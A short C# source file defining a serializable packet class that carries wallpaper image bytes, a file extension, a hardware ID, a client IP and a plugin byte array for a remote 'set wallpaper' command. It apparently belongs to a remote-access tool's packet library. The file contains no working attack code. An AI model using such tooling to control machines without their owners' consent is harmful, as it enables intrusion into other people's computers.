using System;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace PacketLib.Packet
{
    [Serializable]
    public class WallPaperPacket : IPacket
    {
        public WallPaperPacket(byte[] wallpaper, string ext) : base() 
        {
            this.packetType = PacketType.MISC_SET_WALLPAPER;

            this.wallpaper = wallpaper;
            this.ext = ext;
        }

        public string HWID { get; set; }
        public string baseIp { get; set; }
        public byte[] plugin { get; set; }
        public PacketType packetType { get; }
        public PacketState packetState { get; set; }
        public string status { get; set; }
        public string datePacketStatus { get; set; }
        public int packetSize { get; set; }

        public byte[] wallpaper { get; set; }
        public string ext { get; set; }
    }
}
